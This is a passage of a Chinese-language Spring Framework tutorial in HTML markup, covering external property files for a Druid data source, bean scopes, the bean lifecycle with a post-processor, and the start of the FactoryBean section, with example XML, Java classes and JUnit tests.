class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentSix&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">p:id</span>=<span class="string">&quot;1006&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;小明&quot;</span> <span class="attr">p:clazz-ref</span>=<span class="string">&quot;clazzOne&quot;</span> <span class="attr">p:teacherMap-ref</span>=<span class="string">&quot;teacherMap&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-10、实验十：引入外部属性文件"><a href="#2-2-10、实验十：引入外部属性文件" class="headerlink" title="2.2.10、实验十：引入外部属性文件"></a>2.2.10、实验十：引入外部属性文件</h3><h4 id="①加入依赖"><a href="#①加入依赖" class="headerlink" title="①加入依赖"></a>①加入依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- MySQL驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 数据源 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.31<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="②创建外部属性文件"><a href="#②创建外部属性文件" class="headerlink" title="②创建外部属性文件"></a>②创建外部属性文件</h4><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/10.png"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jdbc.user</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">jdbc.password</span>=<span class="string">atguigu</span></span><br><span class="line"><span class="attr">jdbc.url</span>=<span class="string">jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC</span></span><br><span class="line"><span class="attr">jdbc.driver</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure><h4 id="③引入属性文件"><a href="#③引入属性文件" class="headerlink" title="③引入属性文件"></a>③引入属性文件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入外部属性文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="④配置bean"><a href="#④配置bean" class="headerlink" title="④配置bean"></a>④配置bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;druidDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.user&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑤测试"><a href="#⑤测试" class="headerlink" title="⑤测试"></a>⑤测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testDataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring-datasource.xml&quot;</span>);</span><br><span class="line">    <span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> ac.getBean(DataSource.class);</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">    System.out.println(connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-11、实验十一：bean的作用域"><a href="#2-2-11、实验十一：bean的作用域" class="headerlink" title="2.2.11、实验十一：bean的作用域"></a>2.2.11、实验十一：bean的作用域</h3><h4 id="①概念"><a href="#①概念" class="headerlink" title="①概念"></a>①概念</h4><p>在Spring中可以通过配置bean标签的scope属性来指定bean的作用域范围，各取值含义参加下表：</p><table><thead><tr><th><strong>取值</strong></th><th><strong>含义</strong></th><th><strong>创建对象的时机</strong></th></tr></thead><tbody><tr><td>singleton（默认）</td><td>在IOC容器中，这个bean的对象始终为单实例</td><td>IOC容器初始化时</td></tr><tr><td>prototype</td><td>这个bean在IOC容器中有多个实例</td><td>获取bean时</td></tr></tbody></table><p>如果是在WebApplicationContext环境下还会有另外两个作用域（但不常用）：</p><table><thead><tr><th><strong>取值</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>request</td><td>在一个请求范围内有效</td></tr><tr><td>session</td><td>在一个会话范围内有效</td></tr></tbody></table><h4 id="②创建类User"><a href="#②创建类User" class="headerlink" title="②创建类User"></a>②创建类User</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"><span class="keyword">private</span> Integer id;</span><br><span class="line"><span class="keyword">private</span> String username;</span><br><span class="line"><span class="keyword">private</span> String password;</span><br><span class="line"><span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(Integer id, String username, String password, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">            <span class="string">&quot;, username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③配置bean"><a href="#③配置bean" class="headerlink" title="③配置bean"></a>③配置bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- scope属性：取值singleton（默认值），bean在IOC容器中只有一个实例，IOC容器初始化时创建</span></span><br><span class="line"><span class="comment">对象 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- scope属性：取值prototype，bean在IOC容器中可以有多个实例，getBean()时创建对象 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.bean.User&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="④测试"><a href="#④测试" class="headerlink" title="④测试"></a>④测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testBeanScope</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring-scope.xml&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> ac.getBean(User.class);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> ac.getBean(User.class);</span><br><span class="line">    System.out.println(user1==user2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-12、实验十二：bean的生命周期"><a href="#2-2-12、实验十二：bean的生命周期" class="headerlink" title="2.2.12、实验十二：bean的生命周期"></a>2.2.12、实验十二：bean的生命周期</h3><h4 id="①具体的生命周期过程"><a href="#①具体的生命周期过程" class="headerlink" title="①具体的生命周期过程"></a>①具体的生命周期过程</h4><ul><li>bean对象创建（调用无参构造器）</li><li>给bean对象设置属性</li><li>bean对象初始化之前操作（由bean的后置处理器负责）</li><li>bean对象初始化（需在配置bean时指定初始化方法）</li><li>bean对象初始化之后操作（由bean的后置处理器负责）</li><li>bean对象就绪可以使用</li><li>bean对象销毁（需在配置bean时指定销毁方法）</li><li>IOC容器关闭</li></ul><h4 id="②修改类User"><a href="#②修改类User" class="headerlink" title="②修改类User"></a>②修改类User</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;生命周期：1、创建对象&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(Integer id, String username, String password, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;生命周期：2、依赖注入&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;生命周期：3、初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroyMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;生命周期：5、销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">            <span class="string">&quot;, username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意其中的initMethod()和destroyMethod()，可以通过配置bean指定为初始化和销毁的方法</p></blockquote><h4 id="③配置bean-1"><a href="#③配置bean-1" class="headerlink" title="③配置bean"></a>③配置bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用init-method属性指定初始化方法 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使用destroy-method属性指定销毁方法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.bean.User&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;initMethod&quot;</span><span class="attr">destroy-method</span>=<span class="string">&quot;destroyMethod&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1001&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;23&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="④测试-1"><a href="#④测试-1" class="headerlink" title="④测试"></a>④测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testLife</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> newClassPathXmlApplicationContext(<span class="string">&quot;spring-lifecycle.xml&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">bean</span> <span class="operator">=</span> ac.getBean(User.class);</span><br><span class="line">    System.out.println(<span class="string">&quot;生命周期：4、通过IOC容器获取bean并使用&quot;</span>);</span><br><span class="line">    ac.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="⑤bean的后置处理器"><a href="#⑤bean的后置处理器" class="headerlink" title="⑤bean的后置处理器"></a>⑤bean的后置处理器</h4><p>bean的后置处理器会在生命周期的初始化前后添加额外的操作，需要实现BeanPostProcessor接口，</p><p>且配置到IOC容器中，需要注意的是，bean后置处理器不是单独针对某一个bean生效，而是针对IOC容器中所有bean都会执行</p><p>创建bean的后置处理器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.spring.process;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeansException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.config.BeanPostProcessor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBeanProcessor</span> <span class="keyword">implements</span> <span class="title class_">BeanPostProcessor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span></span><br><span class="line">        <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;☆☆☆&quot;</span> + beanName + <span class="string">&quot; = &quot;</span> + bean);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">postProcessAfterInitialization</span><span class="params">(Object bean, String beanName)</span></span><br><span class="line">        <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;★★★&quot;</span> + beanName + <span class="string">&quot; = &quot;</span> + bean);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在IOC容器中配置后置处理器：</p><blockquote><!-- bean的后置处理器要放入IOC容器才能生效 --><p>&lt;bean id&#x3D;”myBeanProcessor”class&#x3D;”com.atguigu.spring.process.MyBeanProcessor”&#x2F;&gt;</p></blockquote><h3 id="2-2-13、实验十三：FactoryBean"><a href="#2-2-13、实验十三：FactoryBean" class="headerlink" title="2.2.13、实验十三：FactoryBean"></a>2.2.13、实验十三：FactoryBean</h3><h4 id="①简介"><a href="#①简介" class="headerlink" title="①简介"></a>①简介</h4><p>FactoryBean是Spring提供的一种整合第三方框架的常用机制。和普通的bean不同，配置一个</p><p>FactoryBean类型的bean，在获取bean的时候得到的并不是class属性中配置的这个类的对象，而是</p><p>getObject()方法的返回值。通过这种机制，Spring可以帮我们把复杂组件创建的详细过程和繁琐细节都屏蔽起来，只把最简洁的使用界面展示给我们。</p><p>将来我们整合Mybatis时，Spring就是通过FactoryBean机制来帮我们创建SqlSessionFactory对象的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Copyright 2002-2020 the original author or authors.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span 